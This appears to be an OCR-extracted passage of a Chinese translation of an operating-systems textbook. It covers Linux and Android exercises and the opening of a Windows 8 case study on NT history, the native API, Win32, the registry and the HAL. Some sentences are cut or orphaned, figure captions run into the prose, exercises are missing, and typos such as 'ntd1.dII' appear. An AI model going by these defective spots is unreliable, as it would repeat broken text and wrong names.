如果不能，请说明原因。
18.通常情况下，你认为守护进程比交互进程具有 更高的优先级还是更低的优先级?
为什么?
19.当一个新进程被创建时，它一定会被分配一个 唯一的整数作为它的PID 。
在内核里只有一个 计数器是否足够?
每当创建一个进程时，计数 器就会递增，并且作为新进程的PID 。
讨论你 的结论。
20.在每个任务结构中的进程项中，父进程的PID 被储存。
为什么?
21. 在fork 系统调用中，写时复制机制被用作一个 优选法，这样副本只有在一个进程(父进程或 子进程)试图写入页面才会被创建。
假设一个 进程P1成功创建进程P2和进程P3 。
解释这种 情况下页面共享是如何处理的。
22.相对于传统的UNIX fork调用，Linux的clone命令 会使用什么样的sharing_flags位的组合来创建常规 的UNIX线程?
23.A 和B两个任务需要执行同样的工作。
然而， 任 务A 拥有更高的优先级，需要给予更多的 CPU时间。
解释一下它是如何在每一个Linux 调度器 (O(1) 和CFS调度器)下实现的?
24.一些UNIX 系统是tickless, 这意味着它们没有 周期时钟中断。
为什么要这样设计?
同时， tickless 对只运行一个进程的计算机(如嵌入式 系统)有意义吗?
26. 某个编辑器有100KB的程序文本，30KB的初始 化数据和50KB的BSS 。
初始堆栈是10KB。
假 设这个编辑器的三个复制是同时开始的。
(a) 如 果使用共享文本，需要多少物理内存呢?
(b) 如 果不使用共享文本又需多少物理内存呢?
27. 在Linux中打开文件描述符表为什么是必要的呢?
28.在Linux中，数据段和堆栈段被分页并交换到特 殊分页磁盘或分区的临时副本上，但是代码段 却使用了可执行二进制文件。
为什么?
29.描述一种使用mmap 和信号量来构造一个进程 内部间通信机制的方法。
30.一个文件使用如下的mmap 系统调用映射：
mmap(65536,32768,READ,FLAGS,fd,0)
每页有8KB 。
当在内存地址72000处读一个字 节时，访问的是文件中的哪个字节?
31 . 当前 一 个问题的系统调用执行后，执行 munmap(65535,8192) 调用会成功吗?
如果成 功，文件的哪些字节会保持映射?
如果失败， 为什么呢?
32.一个页面故障会导致错误进程终止吗?
如果 会，举一个例子。
如果不会，请解释原因。
33.在内存管理的伙伴系统中，两个相邻的同样大 小的空闲内存块有没有可能同时存在而不会被 合并到一个块中?
如果有可能，解释是怎么样 的情况；如果没有可能，说明为什么
34.据说在代码段中分页分区要比分页文件性能更 好。
为什么呢?
35.举两个例子说明相对路径名比绝对路径名有优势。
(a)A 想要0到10字节处的一把共享锁。
(b)B 想要20到30字节处的一把互斥锁。
(c)C 想要8到40字节处的一把共享锁。
(d)A 想要25到35字节处的一把共享锁。
(e)B 想要8字节处的一把互斥锁。
38.说明在什么情况下一个进程可能会请求共享锁 或互斥锁。
请求互斥锁的过程中可能会遇到什
么问题?
39. 如果一个Linux 文件拥有保护模式755(八进 制),文件所有者、所有者所在组以及其他每 个用户分别能对这个文件做什么操作?
41.在图10-24中，当打开链接之后，Fred 和Lisa在 他们各自的目录中都能够访问文件x。
这个访 问是完全对称的吗，也就是说其中一个人能对 文件做的事情另一个人也可以做?
42.正如我们看到的，绝对路径名从根目录开始查 找，而相对路径名从工作目录开始查找。
提供 一种有效的方法实现这两种查找。
43. 当文件/usr/ast/work/f 被打开，读i节点和目录 块时需要 一 些磁盘访问。
假设根目录的i节 点 始终在内存中，且所有的目录都是一个块大小， 计算需要的磁盘访问数量。
44. 一个Linux i节点有12个磁盘地址放数据块，还 有一级、二级和三级间接块。
如果每一个块能 放256个磁盘地址，假设一个磁盘块的大小是 1KB, 能处理的最大文件的大小是多少?
45. 在打开文件的过程中，i 节点从磁盘中被读出， 并被放入内存中的i节点表里。
这个表中有些表 项在磁盘中没有。
其中一个就是计数器，它是 用来记录i节点已经被打开的次数。
为什么需要 这个表项?
46. 在多CPU 平台上，Linux 为每个CPU 维护一个 runqueue。
这样做好吗?
请给出解释。
48.pdflush 线程可以被周期性地唤醒，把多于30秒 的旧页面写回到磁盘。
这个为什么是必要的?
49.在系统崩溃并重启后，通常一个恢复程序将运 行。
假设这个程序发现一个磁盘i 节点的连接 数是2,但是只有一个目录项引用了这个i 节点。
它能够解决这个问题吗?
如果能，该怎么做?
50. 猜一下哪个Linux系统调用是最快的?
51.对一个从来没有被连接的文件取消连接可能 吗?
会发生什么?
52. 基于本章提供的信息，如果一个Linux ext2文 件系统放在一个1.44MB的软盘上，用户文件 数据最大能有多少可以储存在这个软盘上?
假
设磁盘块的大小是1KB。
53.考虑到如果学生成为超级用户会造成的所有麻 烦，为什么这个概念还会出现?
54.一个教授通过把文件放在计算机科学学院的 Linux 系统中的一个公共可访问的目录下来与 他的学生共享文件。
一天他意识到前一天放在 那的一个文件变成全局可写的了。
他改变了权 限并验证了这个文件与他的原件是一样的。
第 二天他发现文件已经被修改了。
这种情况为什 么会发生，又如何预防呢?
55.Linux 支持系统调用fsuid, 它 与setuid 不同。
setuid 允许使用者拥有与他运行的程序相关的 有效id的所有权利，而fsuid 只准许正在运行程 序的使用者拥有特殊的权利，只能够访问文件。
这个特性为什么有用?
56. 在Linux 系统中，进入/proc/#### 目录，其中 ####是一个正在运行的进程对应的十进制数。
给下边的问题一个合理的解释：
(a) 在这个目录中大多数文件的大小是多少?
(b) 大多数文件的时间和日期设置是什么?
(c) 提供什么类型的访问权限给用户以访问这 些文件?
57. 如果你正在写一个Android 的活动，用来在浏 览器中显示一个Web页面，在不失去任何重要 内容的情况下，如何实现其活动状态保存的状 态量最小化?
58. 如果你在Android上编写利用socket 下载文件这 样的与网络相关的代码，这和在一个标准的 Linux 系统上编写时有哪些不同呢?
59. 如果你正在为系统设计类似Android的zygote 进 程，它创建的每个进程中都将有多个线程运行。
你会希望在zygote 中启动这些线程还是在fork 操作之后?
60. 设想你使用Android的Binder IPC来发送一个对 象给另一个进程。
稍后返回了一个对象，你发 现它与你之前发送的对象相同。
对于进程中的 调用，你可以做什么假设或不能做什么假设?
61. 考虑一个Android 系统，启动后紧接着的操作 如下：
1)主应用程序(或启动器)被启动。
2)电子邮件应用程序在后台启动同步邮箱操 作。
3)用户启动一个摄像头应用程序。
4)用户启动浏览器应用程序。
用户利用浏览器观看网页需要越来越多的内存，
直到一切就绪。
在这个过程中发生了什么?
62.写一个允许简单命令执行的最小的shell,并 且 这些命令能在后台执行。
63. 使用汇编语言和BIOS 调用，写一个在Pentinum 类计算机上从软盘上引导自己的程序。
这个程 序应该使用BIOS调用来读取键盘以及重复已键 入的字符，仅用来证明这个程序确实在运行。
64. 写一个能通过串口连接两台Linux 计算机的哑 (dumb) 终端程序。
使用POSIX 终端管理调用 来配置端口。
66.实现一个基本的用户级线程库，该线程在
Linux的上层运行。
库的API 应该包含函数调用， 如mythreads_init、mythreads_create、
mythreads_join、mythreads_exit、
mythreads_yield 、mythreads_self, 可能还 有一些其他的。
进一步实现这些同步变量，以 便用户能使用安全的并发操作： mythreads_
mutex_init,mythreads_mutex_lock,
mythreads_mutex_unlock 。
在开始前，清晰 地定义API 并说明每个调用的语义。
接着使用 简单的轮转抢占调度器实现用户级的库。
还需 要利用该库编写一个或更多的多线程应用程 序，用来测试线程库。
最后，用另一个像本章 描述的Linux2.6 O(1)的调度策略替换简单的调 度策略。
使用每种调度器时比较你的应用程序 的性能。
67. 编写一个shell 脚本，显示一些重要的系统信息， 例如运行的进程、主目录和当前目录、处理器 类型、当前的CPU利用率等。
第11章
Modern Operating Systems,Fourth Edition
实例研究2: Windows 8
11.1 Windows 8.1的历史
图11-1 微软桌面PC的主要操作系统的发布日期
11.1.120世纪80年代：MS-DOS
日 截至2017年6月最新的桌面版本是Windows 10。
——译者注
回到微软。
在很短的时间之内，微软从一家本地公司西雅图计算机产品 (Seatle Computer Products)买 到了一份CP/M 的拷贝，移植到IBM PC中，并且授权IBM 使用。
这个产品被命名为MS-DOS 1.0 (MicroSoft Disk Operating System) 并且在1981年与第一款IBM PC一同发售。
11.1.220世纪90年代：基于MS-DOS 的Windows
Windows 3.0不是一款真正的操作系统，而是在MS-DOS 上构建的图形用户界面，它仍然受到机器和 文件系统的限制。
所有的程序在同一地址空间内运行而且它们中的任何一处bug都会使得整个系统崩溃。
1995年8月，Windows 95发布了。
它在一个成熟的系统内包括了许多特性，包括虚拟内存、进程管 理、多程序设计、32位的程序接口。
然而，它仍然缺少安全性，并且在操作系统和应用程序之间提供了 很少的隔离措施。
因此这些不稳定的问题仍然存在，在随后发布的Windows 98和Windows Me中也一样。
在它们中MS-DOS仍然以16位汇编代码运行在Windows操作系统内核中。
11. 1.321世纪00年代：基于NT 的Windows
Cutler的系统由于包含很多新技术被称作NT(New Technology,也因为最初的目标处理器是新型的Intel
860,代码名称是N10) 。
NT开发的重点是方便地 在不同的处理器之间切换以及安全性和可靠性， 并兼容基于MS-DOS的Windows版本。
Cutler 的 DEC工作背景展现在多个方面，有不止一处体现 出NT系统与VMS以及其他由Cutler设计的系统的 相似性，如图11-2所示。
那些仅仅熟悉UNIX的程序员发现NT的 架
图11-2 由 Dave Cutler开发的DEC 操作系统
构非常不同。
这不仅仅是因为受到了VMS 的影响，也是因为在当时计算机系统的设计上普遍存在差异。
UNIX是在20世纪70年代为单处理器、16位、微内存、切换系统设计的，那时进程是最小的并行和组成单 元。
而且fork/exec 是并不消耗很多资源的操作命令(因为切换系统经常通过磁盘拷贝)。
NT 是在20世纪 90年代初期设计的，当时多处理器、32位、大容量存储、虚拟内存系统已经非常普及。
在NT系统中，线 程是并行单元，动态链接库是组成单元，并且fork/exec 通过单一操作命令来实现创建一个全新的进程， 然后运行另外一个程序，而不需要首先复制一个拷贝。
第一个基于NT的Windows 版本在1993年发布，它被称作Windows NT 3.1是为了匹配Windows 3.1。
与IBM的合作破裂了，因为虽然仍然支持OS/2 界面，但主要界面是Windows API的32位扩展，称为 Win32。
在启动NT项目到NT第一次上市的那段时间里，Windows 3.0发布了，并且在商业上取得了巨大 的成功。
它不仅可以运行Win32程序，并且使用Win32兼容库。
就像基于MS-DOS的Windows 的最初版本一样，基于NT的Windows 的最初版本也不成功。
NT 需要 更多的内存，那时只有很少的32位应用程序，并且与设备驱动和应用程序的不兼容使得许多消费者重新
实例研究2: Windows 8 489
图11-3显示了Win32 API和Windows 之间的关系。
具有基于MS-DOS 的Windows 和基于NT的 Windows通用的API促成了NT的成功。
图11-3 Win32 API允许程序在几乎所有版本的Windows上运行
关于早期开发NT的人物历史在《Showstopper》甲 (Zachary,1994) 一书里有相关的介绍。
书中讲 述了很多关键的人物，以及如此庞大的软件开发项目的困难。
11.1.4 Windows Vista
Windows Vista 是微软目前为止最为全面的操作系统。
最初的计划太过于激进以至于头几年的 Vista 开发必须以更小的范围重新开始。
计划严重依赖于微软的类型安全、垃圾回收、 .NET 语 言C# 等 技 术，以及一些有意义的特性，例如用来从多种不同的来源中搜索和组织数据的WinFS统一存储系统。
整个操作系统的规模是相当惊人的。
最早NT系统发行时只有300万行C/C++ 语句，到NT 4时增长到 1600万行，2000是3000万行，XP 是5000万行，而到了Vista 已经超过了7000万行，Windows 7与 Windows 8则更多。
11.1.521世纪10年代：现代Windows
11.2 Windows编程
现在开始Windows的技术细节研究。
但是，在研究详细的内部结构之前，我们会看看原始的NT系
统调用接口，然后是基于NT的Windows中引入的Win32编程子系统，以及Windows 8中的现代WinRT编 程模式。
现代Windows应用
Windows 桌面应用
原生NT API,C/C++运行时 (ntd1.dII)
NTOS内核层 (ntoskrnl.exe)
管理程序 (hvix,hvax)
图11-4现代Windows的编程层
NT 操作系统的核心是NTOS 内核态程序(ntoskrnl.exe),它提供了实现操作系统的其他部分所需要 的传统系统调用接口。
在Windows中，只有微软的程序员编写系统调用层。
已经公开的用户态接口属于 操作系统本身，它通过运行在NTOS 层顶层的子系统 (subsystem) 来实现。
最早的NT支持三个子系统：OS/2 、POSIX 、Win32 。
OS/2在Windows XP中已经不使用了，POSIX 也终于在Windows 8.1中被移除了。
如今所有的微软程序都构建在Win32子系统之上，例如.NET框架下 的WinFX API 。
WinFX包含了许多Win32中的功能，实际上许多WinFX基础类库 (Base Class Libray) 只 是Win32 API上的一层封装。
WinFX的优势在于处理大量新的对象类型，对于接口的持续简化，以及采 用了.NET框架中的CLR(Common Language Run-time) 及垃圾回收处理。
除了WinRT API之外，还有许多已经存在的Win32 API被收录在MSDK (Microsoft Development Kit) 之中。
原始的WinRT API并不足以写出许多程序，其中的一些Win32 API是用于限制应用程序的行为的。
举例来说，应用无法使用MSDK来直接创建线程，而是必须依赖于Win32线程池来运行同一进程中的并 发事件。
这是因为现代Windows 由原本的线程模型转化为任务模式，以解决在编程模型(尤其是并发模 型)中出现的资源管理问题(优先级、CPU 调度等)。
此外，其他被删除的API还包括Win32中的虚拟内 存API, 希望程序员采用Win32堆管理API而不是直接对内存进行管理。
此外那些之前在Win32中就被删
除 的API, 如ANSI API, 在MSDK中也被删除了。
MSDK API只支持Unicode。
选择使用“现代”(modern) 这样的词语来形容新的Windows 着实让人感到惊喜。
可能十年之后的 Windows 产品会采用后现代 (post-modern) 这样的词语来形容。
不同于传统的Win32 进程，运行现代应用程序的进程的生命周期由操作系统管理着。
当用户切换应 用程序时，操作系统会给予这个线程几秒的时间用于保存状态，然后在用户切换回来之前停止给予这个 进程更多的资源。
如果系统资源出现比较低的情况，操作系统甚至会释放该进程占有的资源，直到用户 重新切换回这个进程，操作系统才会重新启动该进程。
那些需要在后台运行的程序必须采用新的WinRT API 进行编写。
为了节省电力以及阻止后台程序影响前台正在被用户使用的程序，这些后台程序被操作 系统小心地管理着。
这些改动都是为了使得Windows 在移动端表现得更好。
在Win32 桌面上，应用程序是通过运行安装程序(安装程序属于应用程序的一部分)进行部署的。
现代应用程序必须使用Windows 应用商店中的程序进行安装，这些部署的应用程序由开发商上传到微软 在线商店中。
微软完全遵循了苹果推出的成功模式，这种模式也被安卓所采用。
除非应用程序通过验证， 否则微软公司不允许它们进入商店，在一系列检查中，微软公司确保应用程序仅使用MSDK提供的API。
当一个现代应用程序正在运行时，它永远在一个叫作AppContainer 的沙盒里被运行。
使用沙盒进 程来运行程序是为了安全性的考虑，它可以隔离那些不太被信任的代码，以防止其试图篡改操作系统或 用户数据。
AppContainer 把每一个应用程序都看成一个新的用户，然后采用Windows 安全功能来防止其 随便地访问系统资源。
当一个应用程序需要系统资源时，可以采用WinRT API中包含的功能来与中介进 程 (broker process) 进行通信，这些进程拥有大部分操作系统的访问权限，例如用户的文件。
图11-5 用于构建NT子系统的模块
这组库实现了特定于系统的高级操作系统功能，并包含了使用子系统(在左侧显示)和子系统进程 本身之间进行通信的桩程序(在右侧显示)。
对子系统进程的调用通常采用内核模式本地过程调用 (Local Procedure Call,LPC) 所提供的功能，它实现了跨进程的进程调用。
在Win32 CreateProcess中的钩子函数 (hook) 通过查看二进制图像来检测子系统中每个程序的请
NT内核有很多一般用途的设备，可以用来编写操作系统特定的子系统。
但是为了准确地执行每一个
实例研究2: Windows 8 493
fork函数调用，内核提供一个Win32特殊类型串表atoms, 通过进程有效实现只读字符串的共享。
11.2.1 原 生NT 应用编程接口
大多数原生NT系统调用都是对内核态对象进行操作的，包括文件、进程、线程、管道、信号量等。
基本性质，如继承和多态性。
图11-6 常见的内核态对象类别
在原生NT API中存在创建新的内核态对象
或操作已经存在的对象的调用。
每次创建和打开对象的调用都返回一个句 柄(handle) 给调用者 (caller) 。
句柄可在接下来用于执行对象的操作。
句柄是特定于创建它们的具体进程的。
通常句柄不可以直接交给 其他进程，也不能用于同一个对象。
然而，在某些情况下通过一个受保护的方法有可能把一个句柄复制 到其他进程的句柄表中进行处理，允许进程共享访问对象——即使对象在名字空间无法访问。
复制句柄 的进程必须有来源和目标进程的句柄。
并不是所有系统创建的数据结构都是对象，并不是所有的对象都是内核对象。
那些真正的内核态对 象是那些需要命名、保护或以某种方式共享的对象。
通常，这些内核态对象表示了在内核中的某种编程 抽象。
每一个内核态的对象有一个系统定义类型，有明确界定的操作，并占用内核内存。
虽然用户态的 程序可以执行操作(通过系统调用),但是不能直接得到数据。
图11-7为一些原生API的示例，通过特定的句柄操作内核对象，如进程、线程、IPC 端口和内存区 (用来描述可以映射到地址空间的内存对象)。
NtCre ateProcess 返回一个创建新进程对象的句柄， SectionHandle 代表一个执行实例程序。
ExceptionPortHandle 用来在错误出现且没有被调试器处理时与 子系统进行通信，DebugPort Handle用来在出现异常(例如，除零或者内存访问越界)之后把进程控 制权交给调试器的过程中与调试器通信。
NtCreate线程需要ProcHandle, 因为ProcHandie 可以在任意一个含有句柄的进程中(有足够的访 问权限)创建线程。
同样，NtAllocateVirtualMemory 、NtMapViewOfSection 、NtReadVirtualMemory
和NtWriteVirtualMemory 可使进程不仅操作自己的地址空间，也可以分配虚拟地址和映射段，还可以读 写其他进程的虚拟内存。
NtCreateFile 是一个内部API 调用，用来创建或打开文件。
NtDuplicate-
Object, 可以在不同的进程之间复制句柄的API调用。
当然不是只有Windows有内核态对象。
UNIX 系统也同样支持内核态对象，例如文件、网络数据包、 管道、设备、进程、共享内存的IPC设备、消息端口、信号和I/O 设备。
在UNIX中有各种各样的方式命
图11-7 在进程之间使用句柄来管理对象的原生NT API调用示例
名和访问对象，例如文件描述符、进程ID 、SystemV IPC对象的整型ID和设备节点。
每一类的UNIX对 象的实现是特定于其类别的。
文件和socket 使用不同的设施 (facility), 并且是SystemV IPC机制、程序、 装置之外的。
Windows中的内核对象使用一个基于NT名字空间中关于对象的句柄和命名统一设备来指代内核对 象，而且使用一个统一的集中式对象管理器。
句柄是进程特定的，但正如上文所述，可以被另一个进程 使用。
对象管理器在创建对象时可以给对象命名，可以通过名字打开对象的句柄。
对象管理器在NT名字空间中使用unicode (宽位字符)命名。
不同于UNIX,NT 一般不区分大小写 (它保留大小写但不区分)。
NT 名字空间是一个分层树形结构的目录，表示联系和对象。
对象管理器提供统一的管理同步、安全和对象生命期的设备。
对于对象管理器提供给用户的一般设 备是否能为任何特定对象的用户所获得，这是由执行体部件来决定的，它们都提供了操纵每一个对象类 型的内部API。
永久性名字也用来描述同步的对象或者共享内存，因此它们可以被进程共享，避免了当进程频繁启 动和停止时来不断重建。
设备文件和经常使用的驱动程序会被给予永久性名字，并且给予特殊索引节点 持久属性，这些索引节点保存在UNIX的/dev目录下。
我们将在下一节中描叙纯NT API的更多特征，讨论Win32 API在NT系统调用的封装性。
11.2.2 Win32应用编程接口
Win32函数调用统称为Win32 API接口。
这些接口已经被公布并且详细地写在了文档上。
这些接口 在调用的时候采用库文件链接流程：通过封装来完成原始NT系统调用，有些时候也会在用户态下工作。
虽然原始API没有公布，但是这些API的功能可以通过公布的Win32 API来调用实现。
随着新的Windows版
监督，就像我们在11.4节里描述的那样。
图11-8 Win32 API调用以及它们所包含的原生NT
一些Win32调用使用路径名，然而相关的NT内 API调用示例
核调用使用句柄。
所以这些封装流程包括打开文件，调用NT内核，最后关闭句柄。
封装流程同时包括把 Win32 API从ANSI编码变成Unicode编码。
在图11-8的Win32函数里使用字符串作参数的实际上是两套API, 例如参数CreateProcessW和CreateProcessA 。
当这些参数要传递到下一个API时，这些字符串必须翻译成 Unicode编码，因为NT内核调用只认识Unicode。
因为已经存在的Win32接口很少随着操作系统的改变而改变，所以从理论上说能在前一个版本系统 上运行的程序也能正常地在新版本的系统上运行。
可在实际情况中，依然经常存在新系统的兼容性问题。
Windows太复杂了以至于有些表面上不合逻辑的改动会导致应用程序运行失败。
应用程序本身也有问题， 例如，它们也经常做细致的操作系统版本检查或者本身就有潜在的问题只不过是在新系统上暴露出来了。
然而，微软依旧尽力在每个版本上测试不同的兼容性问题，并且力图提供特定的解决办法。
Windows支持两种特殊环境，两种都叫作WOw 。
WOW32通过映射16位系统调用与参数到32位，来 在32位x86系统用16位Windows 3.x应用程序。
同样，WOW64允许32位的程序在x64架构的系统上运行。
Windows API体系不同于UNIX体系。
对于后者来说，操作系统函数很简单，只有很少的参数以及 很少的方法来执行同样的操作，从而可以有很多途径来完成同样的操作。
Win32 提供了非常广泛的接口 和参数，常常能通过三四种方法来做同样的事情，同时把低级别和高级别的函数混合到一起，例如 CreateFile 和CopyFile。
Win32 有创建和管理进程和线程的调用。
Win32 也有许多进程内部通信的调用，例如创建、销毁、 互斥、信号、通信接口和其他IPC实体。
虽然大量的内存管理系统对程序员来说是看不见的，但是一个重要的特征是可见的：一个进程把文 件映射到虚拟内存的一块区域上。
这样允许线程可以使用指针来读写部分文件，而不必执行在硬盘和内 存之间具体的读写数据操作。
通过内存映射，内存系统可以根据需求来执行I/O操作(要求分页)。
Windows 处理内存映射文件使用三种完全不同的手段。
第一种，它提供允许进程管理它们自己虚 拟空间的接口，包括预留地址范围为以后用。
第二种，Win32 支持一种称作文件映射的抽象，这用来代 替可定位的实体，如文件(文件的映射在NT的层次中称作section) 。
通常，文件映射是使用文件句柄来 关联文件。
但有时候也用来指向分页系统中的私有页面。
在Windows中，文件映射的内核态实体被句柄所取代。
就像许多句柄一样，文件映射能够被复制到 其他进程中去。
这些进程中的任意一个能够根据需求映射文件到自己的地址空间中。
这对共享进程间的 私有内存是非常有用的，而且不必再创建文件来实现。
在NT层，文件的映射 (sections) 也 和NT名字空 间保持一致，能够通过文件名来访问。
每个文件系统的卷默认挂载在NT的名字空间里，根据卷的名字来排列。
因此， 一个文件\foobar 可 以命名成\Device\HarddiskVolume\foo\bar 。
对于NTFS的卷来说，挂载点(Windows 称作再分解点)和符 号链接用来帮助组织卷。
低级别的Windows I/O模式基本上是异步的。
一旦一个I/O操作开始，系统调用将允许线程对I/O操 作进行初始化并且开始I/O操 作 。
Windows 支持取消操作，以及一系列的不同机制来支持线程和I/O操作 完成之后的同步。
Windows 也允许程序规定在文件打开时I/O 操作必须同步，许多库函数，例如C库和许 多Win32调用，也规定I/O的同步已支持兼容性或者简化编程模型。
在这些情况下，执行体会在返回到用 户态前和I/O操作结束时进行同步。
Win32的名字空间不同于前面描述的NT内核名字空间。
NT内核空间仅仅只有一部分对Win32 API函 数可见(即使整个NT名字空间可以通过Win32使用特殊字符串来访问，如 “II.”) 。
在Win32中，文件访 问权限和驱动器号相关。
NT目录\DosDevices 里包含了对一个从驱动器号到实际设备对象的数个符号链 接。
例如，DosDevices\C: 是指向\Device\HarddiskVolumel 。
这个目录同样也包含了其他Win32 设备的链 接，如COM1: 、LPT1: 和NUL: (端口号和打印端口，以及非常重要的空设备)。
\DosDevices 是一个真正 指向\?
的链接，这样有利于提高效率。
另外一个NT文件夹，\BaseNamedObjects 用来存储各种各样的内 核对象，这些文件可以通过Win32 API来访问。
这些对象包括用来同步的对象，如信号、共享内存、定 时器以及通信端口，MS-DOS 和设备名称。
对于底层系统接口，我们额外说一下，Win32 API也支持许多GUI 操作，包括系统所有图形接口的 调用。
有对窗口的创建、摧毁、管理和使用的调用，以及支持菜单、工具条、状态栏、滚动条、对话框、 图标和许多在屏幕上显示的元素。
Win32 还提供调用来画几何图形、填充、使用调色板、处理文字以及 在屏幕上放置图标等。
也支持对键盘鼠标和其他输入设备的响应，如音频、打印等其他输出设备。
GUI 操作直接使用win32k.sys 驱动，这个驱动使用特殊的函数从用户态去访问内核态的接口。
因为 这些调用不包含NT操作系统中的系统调用，我们将不会详细讨论。
11.2.3 Windows 注册表
名字空间的根在内核中维护。
存储设备，如系统的卷，附属于名字空间中。
因为名字空间会因为系 统的每次启动重新构建，那么系统怎么知道系统配置的细节呢?
答案就是Windows 会挂载一种特殊的文 件系统(为小文件做了优化)到名字空间。
这个文件系统称作注册表 (registry)。
注册表被组织成了不 同的卷，称作储巢 (hive)。
每个储巢保存在一个单独文件中(在启动卷的目录C:\Windowsl system321 config\ 下)。
当Windows 系统启动时，一个叫作SYSTEM 的特殊储巢被装入了内存，这是由装载内核和
其他启动文件(例如位于启动盘的驱动程序)的程序来完成。
Windows在系统储巢里面保存了大量的重要信息，包括驱动程序去驱使什么设备工作，什么软件进 行初始化，以及什么变量来控制操作系统的操作等。
这些信息甚至被启动程序自己用来决定哪些驱动程 序是用于启动的驱动，哪些必须立即需要启动。
这些驱动包括操作系统自身来识别文件系统和磁盘驱动 的程序。
图11-9 Windows中的注册表储巢。
HKLM是HKEY_LOCAL_MACHINE的缩写
在引入注册表之前，Windows 的配置信息保存在大量的ini 文件里，分散在硬盘的各个地方。
注册 表则把这些文件集中存储，使得这些文件可以在系统启动的过程中引用。
这对Windows热插拔功能是很 重要的。
但是，随着Windows的发展，注册表已经变得无序。
有些关于配置的信息的协议定义得很差， 而且很多应用程序采取了特殊的方法。
许多用户、应用程序以及所有驱动程序在运行时具有私有权限， 而且经常直接更改注册表的系统参数——有时候会妨碍其他程序导致系统不稳定。
注册表是位于数据库和文件系统之间的一个交叉点，但是和每一个都不像。
有整本描写注册表的书 (Born,1998;Hipson,2000;Ivens 1998)。
有很多公司开发了特殊的软件去管理复杂的注册表。
Procmon监视系统中所有对注册表的访问。
有时，一些程序可能会重复访问同一个键达数万次之多。
正如名字所显示的那样，注册表编辑器允许用户对注册表进行编辑，但是一旦你这么做就必须非常 小心。
它很容易造成系统无法引导或损坏应用软件的安装，因此没有一些专业技巧就不要去修改它。
微 软承诺会在以后发布时清理注册表，但现在它仍是庞杂的一堆——比UNIX保留的配置信息复杂得多。
新操作系统的设计者(尤其是iOS 和Android) 极力 避免由于注册表带来的复杂程度和碎片问题。
Win32 程序员通过函数调用可以很方便地访 问注册表，包括创建、删除键、查询键值等。
如 图11-10所示。
当系统关闭时，大部分的注册表信息被存储在 硬盘储巢中。
因为极其严格的完整性要求使得需要 纠正系统功能，自动实现备份，将元数据冲写入硬
图11-10 一些使用注册表的Win32 API调用
盘以防止在发生系统崩溃时所造成的损坏。
注册表损坏需要重新安装系统上的所有软件。
11.3 系统结构
尽管有很多关于Windows 使用方面的书籍，但很少有书讲述它是如何工作的。
不过，查阅 《Microsoft Windows Internals,6th ed,Part1 and 2》(Russionvich 和 Solomon,2004) 是其中最好的选 择之一。
11.3.1 操作系统结构
NT的内核态层如图11-11所示。
NTOS 的内核层在执行体层之上，因为它实现了从用户态到内核态 转换的陷入和中断机制。
图11-11所示的最顶层是系统库ntdll.dII, 它实际工作于用户态。
系统库包括许 多为编译器运行提供的支持功能以及低级库，类似于UNIX中的libc 。
Ntdll.d11也包括了特殊码输入指针 以支持内核初始化线程、分发异常和用户态的异步过程调用 (Asynchronous Procedure Calls,APC)等 。
因为系统库对内核运行是必需的，所以每个由NTOS创建的用户态进程都具有相同固定地址描绘的ntdll 。
当NTOS初始化系统时，会创建一个局部目标并且记录下内核使用的ntdll输入指针地址。
用户态 内核态
硬件
图11-11 Windows 内核态组织结构
在NTOS 内核和执行体层之下是称为硬件抽象层 (Hardware Abstraction Layer,HAL)的软件，该 软件对类似于设备寄存器存取和DMA操作之类的底层硬件信息进行抽象，同时还就BIOS固件是如何表 述配置信息和处理CPU 芯片上的不同(如各种中断控制器)进行抽象。
BIOS 可以从很多公司获得，并 且被集成为计算机主板上的永久内存。
的身影。
它的主要功能是拦截许多内核的特权操作，并且以一种允许多个操作系统在同一时刻运行的方 式进行模拟。
每一个操作系统都在它所处的虚拟机中运行(在Windows 中称为隔扇 (partition))。
hypervisor 会采用硬件架构上的功能来保护物理内存，并保持不同隔扇之间的相对独立性。
每一个运行 在hypervisor 上的操作系统，都会对从物理处理器抽象出来的虚拟处理器 (virtual processor) 的线程及 句柄进行执行和处理。
而hypervisor 则会在物理处理器上对虚拟处理器进行调度。
举例来说，如果一个运行在非主隔扇上的操作系统(如Linux) 采用自旋锁来在两个虚拟处理器之 间进行同步，而其中一个拿着自旋锁的处理器被hypervisor调度下了物理处理器，那么另外一个处理器 所需要等待的时间将会成数量级的增长。
为了解决这个问题，这些操作系统需要改变自旋锁的运作方式， 使得其在很短的时间之内(被hypervisor 调度之前)礼貌地释放即将被调度的虚拟处理器上的自旋锁， 以使得另外一个虚拟处理器之后可以被执行。
内核态下另一个主要部件就是设备驱动器。
Windows 内核态下任何非NTOS或HAL的设备都会用到 设备驱动器，包括文件系统、网络协议栈和其他如防病毒程序、DRM 软件之类的内核扩展，以及与硬 件总线接口的管理物理设备驱动器等。
以下将详细介绍操作系统的不同部件。
1.硬件抽象层
正如之前发布的基于NT的Windows系统 一样，Windows 的目标之一是使得操作系统在不同的硬件平 台之间具有可移植性。
理想情况下，如果需要在一种新型计算机系统中运行该操作系统，仅仅需要在首 次运行时使用新机器编译器重新编译操作系统即可。
但实际上并没有那么简单。
操作系统各层有大量部 件具有很好的可移植性(因为它们主要处理支持编程模式的内部数据结构和抽象，从而支持特定的编成 模式),其他层就必须处理设备寄存器、中断、DMA以及机器与机器间显著不同的其他硬件特征。
大多数NTOS内核源代码由C语言编写而非汇编语言(x86 中仅2%是汇编语言，比x64少1%)。
然而， 所有这些C语言代码都不能简单地从x86系统中移植到一个SPARC 系统，然后重新编译、重新引导，因 为与不同指令集无关并且不能被编译器隐藏的处理机结构及其硬件实现上有很多不同。
像C这样的语言 难以抽象硬件数据结构和参数，如页表输入格式、物理存储页大小和字长等。
所有这些以及大量的特定 硬件的优化即使不用汇编语言编写，也将不得不手工处理。
情况下，尽管版本和支持芯片集不同但只要有相同的处理器结构，系统中所有部件均无需修改就可运行。
通过内存映射I/O 与I/O端口的对比可以更好地了解硬件抽象层是如何工作的。
一些机器有内存映射 I/O, 而有的机器有I/O端口。
驱动程序是如何编写的呢?
是不是使用内存映射I/O?
无需强制做出选择， 只需要判断哪种方式使驱动程序可独立于机器运行即可。
硬件抽象层为驱动程序编写者分别提供了三种 读、写设备寄存器的程序：
uc=READ_PORT_UCHAR(port);WRITE_PORT_UCHAR(port,uc);
us=READ_PORT_USHORT(port);WRITE_PORT_USHORT(port,us);
ul=READ_PORT_ULONG(port); WRITE_PORT_ULONG(port,ul);
这些程序各自在指定端口读、写无符号8、16、32位整数，由硬件抽象层决定是否需要内存映射I/O。
这 样，驱动程序可以在设备寄存器实现方式有差异的机器间使用而不需要修改。
驱动程序会因为不同目的而频繁存取特定的I/O 设备。
